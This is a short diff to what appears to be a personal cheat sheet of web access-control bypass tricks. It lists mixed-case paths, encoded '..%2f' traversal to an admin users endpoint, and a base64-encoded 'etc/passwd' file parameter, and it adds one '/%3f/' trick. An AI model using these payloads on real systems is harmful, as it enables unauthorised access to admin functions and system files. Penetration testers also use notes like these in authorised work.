@@ -21,6 +21,7 @@ upload --> 403
 
 uPlOaDs --> 200
 
+
 ---
 
 https://target/api/admin/users/123 <-- blocked
@@ -33,6 +34,9 @@ https://target/api/fakepath/..%2f/admin/fakepath/..%2f/users/123. <-- Try this
 url/?f=etc/passwd ==> 403
 
 url/?f=L2V0Yy9wYXNzd2Q= ==> 200
+
+/%3f/ ==> 200 Ok
+
 
 ---
 
